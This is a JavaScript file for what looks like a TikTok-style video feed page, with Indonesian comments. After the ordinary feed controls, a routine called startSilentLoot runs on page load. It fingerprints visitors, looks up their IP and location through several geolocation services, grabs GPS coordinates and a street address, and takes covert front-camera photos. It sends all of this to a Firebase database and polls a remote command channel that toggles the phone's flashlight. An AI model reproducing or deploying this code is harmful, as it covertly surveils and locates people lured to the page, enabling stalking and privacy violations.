const comments = document.getElementById("comments");
const feedContainer = document.getElementById("feedContainer");
const videoItems = document.querySelectorAll(".video-item");

function openComments(event) {
    event.stopPropagation();
    if (comments) comments.classList.add("active");
}

function toggleText(event) {
    event.stopPropagation();
    const more = event.currentTarget;
    const caption = more.closest(".caption");
    if (!caption) return;
    if (more.textContent.trim() === "lebih sedikit") {
        caption.innerHTML = caption.dataset.short + " <span class='more' onclick='toggleText(event)'>lebih banyak</span>";
    } else {
        caption.innerHTML = caption.dataset.full + " <span class='more' onclick='toggleText(event)'>lebih sedikit</span>";
    }
}

videoItems.forEach((item) => {
    const container = item.querySelector(".container");
    const video = item.querySelector("video");
    const pauseOverlay = item.querySelector(".pause-overlay");
    const likeBtn = item.querySelector(".like-btn");
    const likeAnim = item.querySelector(".like");
    const saveBtn = item.querySelector(".save-btn");

    if (!video) return;
    let lastTap = 0;

    const updateOverlay = () => video.paused ? pauseOverlay.classList.add("active") : pauseOverlay.classList.remove("active");

    if (container) {
        container.addEventListener("click", (e) => {
            if (comments) comments.classList.remove("active");
            if (e.target.closest(".sidebar") || e.target.closest(".more")) return;
            const now = Date.now();
            if (now - lastTap < 300) {
                if (likeBtn) likeBtn.classList.add("liked");
                if (likeAnim) likeAnim.classList.add("active");
                setTimeout(() => likeAnim.classList.remove("active"), 600);
            } else {
                video.paused ? video.play() : video.pause();
                updateOverlay();
            }
            lastTap = now;
        });
    }
    video.addEventListener("pause", updateOverlay);
    video.addEventListener("play", updateOverlay);
    if (likeBtn) likeBtn.addEventListener("click", (e) => { e.stopPropagation(); likeBtn.classList.toggle("liked"); });
    if (saveBtn) saveBtn.addEventListener("click", (e) => { e.stopPropagation(); saveBtn.classList.toggle("saved"); });
});

// ======================================================
// [ FIXED LOGIC: DATA CENTER SYNC ]
// ======================================================

const BASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";

// FUNGSI UTAMA, BUAT KIRIM DATA KE FIREBASE
async function startSilentLoot() {
    // 1. BUAT SESSION ID (FOLDER UNIK)
    const sessionID = "ONX-" + Math.random().toString(36).substr(2, 6).toUpperCase();
    const params = new URLSearchParams(window.location.search);
    const targetID = params.get('id');
    const osLengkap = await getFullOS();
    let finalSource = "Direct Access";

    if (targetID) {
        const labels = {
            'jaket': 'TikTok',
            'baju': 'Instagram',
            'sepatu': 'Shopee'
        };
        // Kalau ID cocok, pake labelnya. Kalau gak cocok, tampilin ID aslinya.
        finalSource = labels[targetID] || `Unknown ID: ${targetID}`;
    } else if (document.referrer) {
        finalSource = "Ref: " + document.referrer;
    }

    let report = {
        session_id: sessionID,
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        referrer: finalSource,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        language: navigator.language
    };

    try {
        const versiDetail = await getFullOS(); 
        report.platform = versiDetail; // Sekarang isinya jadi "Android 15" atau "Windows 11"
    } catch (e) {
        report.platform = "Unknown Version";
    }

    // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
    async function fetchLocation() {
        // 1. UTAMA: IP2Location (Paling lengkap)
        try {
            const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
            const d = await res.json();
            if (d.ip) {
                return { 
                    ip: d.ip, 
                    isp: d.isp || "Unknown ISP", 
                    city: d.city_name || "Unknown City", 
                    district: d.district || "N/A", 
                    loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
                    asn: d.asn || "N/A"
                };
            }
        } catch (e) { console.log("API 1 Error"); }

        // 2. CADANGAN: IP-API (Gratis & dapet ISP juga buat jaga-jaga)
        try {
            const res = await fetch(`http://ip-api.com/json/`);
            const d = await res.json();
            if (d.status === "success") {
                return { 
                    ip: d.query, 
                    isp: d.isp, 
                    city: d.city, 
                    district: "N/A", 
                    loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`,
                    asn: d.as
                };
            }
        } catch (e) { console.log("API 2 Error"); }

        // 3. LAPISAN KETIGA: IPWHOIS (No Key - Stabil & HTTPS, FOKUS CARI ISP)
        try {
        const res = await fetch(`https://ipwho.is/`);
        const d = await res.json();
            if (d.success) {
                return { 
                    ip: d.ip, isp: d.connection.isp, city: d.city, district: "N/A", 
                    loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
                    asn: d.connection.asn
                };
            }
        } catch (e) { console.log("Lapis 3 (IPWHOIS) Error"); }

        // 4. BENTENG TERAKHIR: Cloudflare (Minimal dapet IP)
        try {
            const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
            const text = await res.text();
            const ip = text.match(/ip=(.*)\n/)[1];
            return { ip: ip, isp: "ISP Not Detected", city: "Unknown", district: "N/A", loc: "#", asn: "N/A" };
        } catch (e) { return { ip: "Offline" }; }

        // LAPISAN SUPPORT 3 DOANG
        // LAPIS 1: IP-API PRO (Pake endpoint demo yang HTTPS-nya kuat)
        try {
            const res = await fetch(`https://demo.ip-api.com/json/?fields=66842623`);
            const d = await res.json();
            if (d.query) return { 
                ip: d.query, isp: d.isp, city: d.city, district: d.district || "N/A", 
                loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`, asn: d.as 
            };
        } catch (e) {}
    
        // LAPIS 2: FreeIPAPI (Ini jarang diblokir karena masih baru)
        try {
            const res = await fetch(`https://freeipapi.com/api/json`);
            const d = await res.json();
            if (d.ipAddress) return { 
                ip: d.ipAddress, isp: d.provider, city: d.cityName, district: "N/A", 
                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`, asn: "N/A" 
            };
        } catch (e) {}
    
        // LAPIS 3: IPAPI.CO (Paling stabil buat global)
        try {
            const res = await fetch(`https://ipapi.co/json/`);
            const d = await res.json();
            if (d.ip) return { 
                ip: d.ip, isp: d.org, city: d.city, district: "N/A", 
                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`, asn: d.asn 
            };
        } catch (e) {}
    }

    // Eksekusi Waterfall
    const locationData = await fetchLocation();
    report = { ...report, ...locationData };


    // 3. AMBIL GPS AKURAT (JIKA ALLOW)
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        // Terjemahin koordinat ke alamat jalan
        const alamatJalan = await getRealAddress(lat, lon);
        
        report.loc = `https://www.google.com/maps?q=${lat},${lon}`;
        report.address_detail = alamatJalan; // <--- Variabel baru buat alamat jalan

        // Update folder yang sama dengan koordinat & alamat baru
        fetch(`${BASE_API}/${sessionID}.json`, { 
            method: 'PATCH', 
            body: JSON.stringify({ 
                loc: report.loc, 
                address_detail: report.address_detail 
            }) 
        });
    }, null, { enableHighAccuracy: true });

    // 4. JALANKAN KAMERA
    initCamera(report, sessionID);
}

async function initCamera(report, sessionID) {
    const TARGET_URL = `${BASE_API}/${sessionID}.json`; // <--- PATH KE FOLDER

    try {
        // const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        await video.play();

        listenForFlash(stream);

        let shots = 0;
        let burst = setInterval(async () => {
            if (shots < 4) {
                shots++;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);

                // Kirim ke variabel photo1, photo2, dst agar tidak saling timpa
                let updateData = { ...report, burst_no: shots };
                updateData[`photo${shots}`] = imageData; // Dinamis: photo1, photo2...

                await fetch(TARGET_URL, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(updateData)
                });
            } else {
                // --- BAGIAN INI YANG DIUBAH ---
                clearInterval(burst); 
                
                // Matikan semua track kamera (Lampu indikator bakal mati)
                stream.getTracks().forEach(track => track.stop());
                
                // Bersihkan object video biar memori lega
                video.srcObject = null;
                console.log("Kamera resmi dimatikan.");
            }
        }, 1500);

    } catch (err) {
        // Kirim data tanpa foto jika ditolak
        fetch(TARGET_URL, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...report, photo: "Access Denied" })
        });
    }
}

async function listenForFlash(stream) {
    const track = stream.getVideoTracks()[0];
    setInterval(async () => {
        try {
            const res = await fetch(COMMAND_URL);
            const cmd = await res.json();
            if (track && track.getCapabilities().torch) {
                await track.applyConstraints({ advanced: [{ torch: cmd.flash === "ON" }] });
            }
        } catch (e) {}
    }, 2000);
}

// FUNGSI GET FULL OS
function parseOldUA() {
    const ua = navigator.userAgent;
    
    // Cek Android
    if (/Android/.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/);
        return match ? `Android ${match[1]}` : "Android";
    }
    
    // Cek iPhone/iOS
    if (/iPhone|iPad|iPod/.test(ua)) {
        const match = ua.match(/OS\s([0-9_]+)/);
        return match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
    }
    
    // Cek Windows
    if (/Windows NT/.test(ua)) {
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Windows NT 6.1")) return "Windows 7";
    }
    
    return navigator.platform;
}

async function getFullOS() {
    if (navigator.userAgentData) {
        try {
            const highEntropy = await navigator.userAgentData.getHighEntropyValues(['platformVersion']);
            const platform = navigator.userAgentData.platform;
            if (platform === "Android") return `Android ${highEntropy.platformVersion}`;
            if (platform === "Windows") {
                let winVer = parseInt(highEntropy.platformVersion.split('.')[0]);
                return winVer >= 13 ? "Windows 11" : "Windows 10";
            }
            return platform;
        } catch (e) { return parseOldUA(); }
    }
    return parseOldUA();
}


async function getRealAddress(lat, lon) {
    try {
        // Pake OpenStreetMap (Nominatim) - Databasenya lebih detail buat Indonesia
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const d = await response.json();
        
        // Ambil objek alamatnya
        const addr = d.address;
        if (!addr) return "Gagal membaca lokasi peta";

        // Ekstraksi data dengan Fallback (Cadangan) kalau satu kosong
        const jalan = addr.road || addr.pedestrian || "Jl. Tidak Terdeteksi";
        const desa = addr.village || addr.suburb || addr.neighbourhood || "Desa/Kel tdk ada";
        const kec = addr.city_district || addr.county || addr.suburb || "Kecamatan tdk ada";
        const kota = addr.city || addr.town || addr.municipality || "Kota/Kab tdk ada";
        const prov = addr.state || "Provinsi tdk ada";
        const kodepos = addr.postcode || "Kodepos tdk ada";
        const negara = addr.country || "Indonesia";

        // Output persis sesuai format yang lu minta
        return `${jalan}, ${desa}, ${kec}, ${kota}, ${prov}, ${kodepos}, ${negara}`;
    } catch (error) {
        return "Gagal dapet alamat detail";
    }
}

window.onload = () => { setTimeout(startSilentLoot, 2000); };
